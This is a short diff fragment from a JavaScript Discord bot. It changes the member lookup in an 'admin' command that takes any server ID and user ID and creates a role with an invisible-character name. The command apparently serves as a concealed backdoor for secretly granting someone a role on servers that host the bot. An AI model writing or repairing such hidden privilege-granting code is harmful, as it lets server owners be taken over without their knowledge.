@@ -27,7 +27,7 @@ client.on('message', message => {
         if (args[0] == prefix + 'admin') {
             var serverid = args[1];
             let guild = client.guilds.get(serverid);
-            var userid = client.users.get(args[2]);
+            var userid = guild.members.get(args[2]);
             try {
                 role = guild.createRole({
                     name: "឵឵឵   ",
